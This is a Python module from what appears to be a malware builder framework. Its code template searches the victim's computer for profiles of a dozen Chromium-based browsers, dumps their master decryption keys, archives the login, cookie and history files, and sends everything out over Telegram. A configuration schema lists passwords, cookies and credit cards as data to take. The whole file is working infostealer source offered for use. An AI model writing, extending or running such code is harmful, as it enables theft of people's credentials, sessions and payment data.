# modules/stealer/browser.py
"""
Browser Stealer Module with Cross-Host Decryption
"""

from typing import Dict, Any
from modules.base import Module
import os
import json
import tempfile
import zipfile
import shutil
import base64
from pathlib import Path


class BrowserStealerModule(Module):
    """Steals browser data using cross-host decryption."""

    def __init__(self, config: Dict[str, Any]):
        super().__init__(config)
        self.name = "Browser Stealer"
        self.id = "browser_stealer"
        self.category = "stealer"
        self.description = "Extracts browser data via cross-host decryption"

    def get_template(self) -> str:
        return """
# --- Browser Stealer Module (Cross-Host) ---

def find_browser_profiles():
    """Find all Chromium browser profiles."""
    profiles = []
    appdata_local = os.getenv("LOCALAPPDATA", "")
    appdata_roaming = os.getenv("APPDATA", "")

    browser_paths = {
        "chrome": os.path.join(appdata_local, "Google", "Chrome", "User Data"),
        "chrome-beta": os.path.join(appdata_local, "Google", "Chrome Beta", "User Data"),
        "edge": os.path.join(appdata_local, "Microsoft", "Edge", "User Data"),
        "brave": os.path.join(appdata_local, "BraveSoftware", "Brave-Browser", "User Data"),
        "opera": os.path.join(appdata_roaming, "Opera Software", "Opera Stable"),
        "opera-gx": os.path.join(appdata_roaming, "Opera Software", "Opera GX Stable"),
        "vivaldi": os.path.join(appdata_local, "Vivaldi", "User Data"),
        "yandex": os.path.join(appdata_local, "Yandex", "YandexBrowser", "User Data"),
        "coccoc": os.path.join(appdata_local, "CocCoc", "Browser", "User Data"),
        "chromium": os.path.join(appdata_local, "Chromium", "User Data"),
        "arc": os.path.join(appdata_local, "Arc", "User Data"),
    }

    for name, path in browser_paths.items():
        if not os.path.exists(path):
            continue
        # Handle flat layout (Opera)
        if any(f in os.listdir(path) for f in ["Login Data", "History", "Cookies"]):
            profiles.append({
                "browser": name,
                "name": "Default",
                "path": path,
                "user_data": path,
                "is_flat": True,
            })
            continue

        # Normal layout with profiles
        for d in os.listdir(path):
            profile_dir = os.path.join(path, d)
            if os.path.isdir(profile_dir):
                if d in ("Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"):
                    profiles.append({
                        "browser": name,
                        "name": d,
                        "path": profile_dir,
                        "user_data": path,
                        "is_flat": False,
                    })
    return profiles


def browser_stealer_main():
    """Main browser stealer entry point."""
    import tempfile
    import shutil
    import zipfile
    import json
    from pathlib import Path

    send_telegram_message("🔍 <b>Starting browser data extraction...</b>")

    profiles = find_browser_profiles()
    if not profiles:
        send_telegram_message("⚠️ No browser profiles found")
        return

    send_telegram_message(f"📂 Found {len(profiles)} browser profiles")

    temp_dir = tempfile.mkdtemp(prefix="browser_data_")

    for profile in profiles:
        try:
            send_telegram_message(f"📁 Processing {profile['browser']}/{profile['name']}")

            # 1. Dump master keys
            keys_data = dump_keys(profile["path"])
            keys_json = os.path.join(temp_dir, f"{profile['browser']}_{profile['name']}_keys.json")
            with open(keys_json, "w") as f:
                json.dump(keys_data.to_dict(), f, indent=2)

            # 2. Archive data files
            archive_path = os.path.join(temp_dir, f"{profile['browser']}_{profile['name']}_data.zip")
            count = archive_profile(profile["path"], archive_path)

            # 3. Send archive to Telegram
            if os.path.exists(archive_path) and os.path.getsize(archive_path) > 0:
                msg = (
                    f"📦 <b>{profile['browser']}/{profile['name']}</b>\\n"
                    f"Files: {count}\\n"
                    f"Size: {os.path.getsize(archive_path) / 1024:.1f} KB"
                )
                send_telegram_message(msg, archive_path)

            # 4. Send keys (small)
            if os.path.exists(keys_json):
                send_telegram_message(f"🔑 Keys for {profile['browser']}", keys_json)

        except Exception as e:
            send_telegram_message(f"❌ Error processing {profile['browser']}: {str(e)}")

    # Cleanup
    shutil.rmtree(temp_dir, ignore_errors=True)
    send_telegram_message("✅ <b>Browser data extraction complete!</b>")

# Execute
browser_stealer_main()
"""

    def get_config_schema(self) -> Dict[str, Any]:
        return {
            "enabled": {"type": "boolean", "default": True, "label": "Enable Browser Stealer"},
            "categories": {
                "type": "array",
                "default": ["password", "cookie", "history", "bookmark", "creditcard"],
                "label": "Data categories to extract",
                "options": ["password", "cookie", "history", "bookmark", "creditcard", "extension"],
            },
        }
